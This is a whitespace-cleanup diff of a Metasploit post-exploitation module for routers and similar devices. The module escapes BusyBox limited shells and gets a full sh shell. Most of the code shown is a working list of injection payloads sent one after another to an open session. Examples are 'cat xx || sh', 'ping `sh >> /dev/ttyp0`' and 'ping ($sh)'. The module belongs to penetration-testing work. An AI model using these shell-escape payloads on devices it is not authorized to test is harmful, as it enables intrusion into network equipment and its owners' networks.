@@ -13,7 +13,7 @@ class Metasploit3 < Msf::Post
       'Description'  => 'This module will send a set of commands to a open
                          session that is connected to a BusyBox limited shell
                          (i.e. a router limited shell). It will try different
-                         known tricks to try to jailbreak the limited shell and 
+                         known tricks to try to jailbreak the limited shell and
                          get a full sh busybox shell.',
       'Author'       => 'Javier Vicente Vallejo',
       'License'      => MSF_LICENSE,
@@ -23,12 +23,12 @@ class Metasploit3 < Msf::Post
         ],
       'Platform'      => ['linux'],
       'SessionTypes'  => ['shell']
-    )    
+    )
   end
 
-  def run    
+  def run
     bfound = false
-    bfound = try_command("cat xx || sh\n","1_1") unless bfound    
+    bfound = try_command("cat xx || sh\n","1_1") unless bfound
     bfound = try_command("ping || sh\n","1_2") unless bfound
     bfound = try_command("echo `sh >> /dev/ttyp0`\n","2_1") unless bfound
     bfound = try_command("ping `sh >> /dev/ttyp0`\n","2_2") unless bfound
@@ -43,10 +43,10 @@ class Metasploit3 < Msf::Post
     bfound = try_command("ping ($sh)\n","5_3") unless bfound
     bfound = try_command("cat xx &amp;&amp; sh\n","6_1") unless bfound
     bfound = try_command("echo xx &amp;&amp; sh\n","6_2") unless bfound
-    bfound = try_command("ping &amp;&amp; sh\n","3_3") unless bfound    
+    bfound = try_command("ping &amp;&amp; sh\n","3_3") unless bfound
     print_error("Unable to jailbreak device shell.") if !bfound
   end
-  
+
   def try_command(param_command, method_number)
       vprint_status("jailbreak sent: #{param_command}.")
       session.shell_write(param_command)
@@ -60,5 +60,5 @@ class Metasploit3 < Msf::Post
       end
       return false
   end
-  
+
 end
